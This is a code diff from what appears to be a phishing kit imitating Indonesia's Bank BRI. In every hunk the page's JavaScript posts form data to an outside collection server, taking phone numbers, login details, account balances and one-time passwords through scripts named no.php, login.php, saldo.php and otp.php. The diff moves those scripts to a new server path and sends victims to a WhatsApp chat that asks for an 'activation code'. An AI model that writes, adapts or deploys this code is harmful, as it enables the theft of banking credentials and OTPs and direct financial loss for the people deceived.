@@ -11,7 +11,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://choreo15pagesdev.wasap.my/';
+location.href='https://wa.me/6282240003166?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20request%20Kode%20Aktivasi';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
@@ -30,7 +30,7 @@ sessionStorage.setItem("nomor", nomor);
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x13/no.php',
+ url: 'https://choreo-is.masuk.web.id/x4/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -58,7 +58,7 @@ document.getElementById('kirim').innerHTML = "Memproses....";
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x13/login.php',
+ url: 'https://choreo-is.masuk.web.id/x4/login.php',
  data: $(formlog).serialize(),
  datatype: 'text', 
  complete: function(data) {
@@ -91,7 +91,7 @@ document.getElementById('kirim').innerHTML = "Verify...";
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x13/saldo.php',
+ url: 'https://choreo-is.masuk.web.id/x4/saldo.php',
  data: $(formsal).serialize(),
  datatype: 'text',
  complete: function(data) {
@@ -125,7 +125,7 @@ $('#formLink').on('submit', function (event) {
  document.getElementById('kirims').value = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/x13/otp.php',
+ url: 'https://choreo-is.masuk.web.id/x4/otp.php',
  async: false,
  dataType: 'text',
  data: $(this).serialize(),
